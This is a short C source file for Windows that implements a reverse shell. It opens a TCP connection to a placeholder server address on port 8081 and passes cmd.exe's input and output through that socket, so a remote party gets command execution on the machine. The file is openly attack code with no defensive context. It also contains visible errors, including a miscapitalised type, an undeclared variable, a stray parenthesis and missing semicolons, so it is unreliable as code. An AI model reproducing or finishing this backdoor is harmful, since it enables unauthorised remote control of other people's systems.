#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main(){
    SOCKET shell;
    sockAddr_in shellAddr;
    WSADATA wsa;
    STARTUPINFO start; //startup info for windows processes
    PROCESS_INFORMATION proc; //info for windows processes
    char ipAddr[] = "SERVER_ADDRESS";
    int port = 8081; 
    char RXbuffer[512];
    
    //Initialize winsock
    WSAStartup(MAKEWORD(2,2), &wsa); 
    
    //Create TCP Socket
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);

    shellAddr.sin_family = AF_INET;
    shellAddr.sin_port = htons(port); //listening port
    shellAddr.sin_addr.s_addr = inet_addr(ipAddr); //serveraddr
    
    //Connect to server
    connection = WSAConnect(shell, (SOCKADDR*)&shellAddr, sizeof(shellAddr), NULL, NULL, NULL);)

    if(connection == SOCKET_ERROR){
        printf("Connection to server failed \n");
        exit(0);
    }
    else{
        recv(shell, RXbuffer, sizeof(RXbuffer), 0);
        //Set startup info struct to 0
        memset(&start, 0, sizeof(start));
        start.cb = sizeof(start);
        start.dwFlags = (STARTF_USESTHANDLES | STARTF_USESHOWWINDOW) //stdio, windows
        
        //Parse all input out and err to shell
        start.hStdInput = start.hStdOutput = start.hStdError = (HANDLE) shell;
        //Create process to spawn windows cmd shell
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &start, &proc);
        WaitForSingleObject(proc.hProcess, INFINITE);
        //Close process and thread
        CloseHandle(proc.hProcess);
        CloseHandle(proc.hThread)
        //Set Buffer to 0 to clear
        memset(RXbuffer, 0, sizeof(RXbuffer));
    }
}
